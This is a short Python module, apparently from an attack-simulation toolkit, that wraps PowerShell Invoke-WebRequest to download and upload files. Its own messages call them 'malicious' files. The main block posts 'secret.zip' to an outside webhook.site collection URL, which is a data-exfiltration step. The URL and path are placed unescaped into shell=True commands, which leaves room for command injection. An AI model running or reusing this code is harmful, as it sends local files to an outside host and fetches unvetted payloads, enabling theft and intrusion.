import subprocess

class Powershell():
    """ Main class for executing powershell commands """
    def __init__(self):
       print('Class:Powershell Initialized')

    def download_file(self, argumenter):
        """
          What:     Execute a powershell command.
          Purpose:  Download a specific file from an URL
        """
        url = argumenter[0]
        try:
          subprocess.run(f'powershell.exe Invoke-Webrequest "{url}" -OutFile .\downloaded\\file.zip', shell=True)
        except subprocess.CalledProcessError as e:
          print(e.output)
          raise ValueError("Error when downloading file")
        else:
          print('PS: Downloaded malicious file')
          return True


    def upload_file(self, argumenter):
        print(argumenter)
        """
          What:     Execute a powershell command.
          Purpose:  Upload a file to an URL
        """
        url = argumenter[0]
        filepath = argumenter[1]
        try:
          subprocess.run(f"powershell.exe Invoke-WebRequest -uri {url} -Method Post -Infile '.\modules\{filepath}' -ContentType 'application/zip'", shell=True)
        except subprocess.CalledProcessError as e:
          print(e.output)
          raise ValueError("Error when uploading file")
        else:
          print('PS: Uploaded malicious file')
          return True

if __name__ == '__main__':
    PS = Powershell()
    PS.upload_file(["https://webhook.site/c926c08d-0882-478e-8170-06740db5a159","secret.zip"])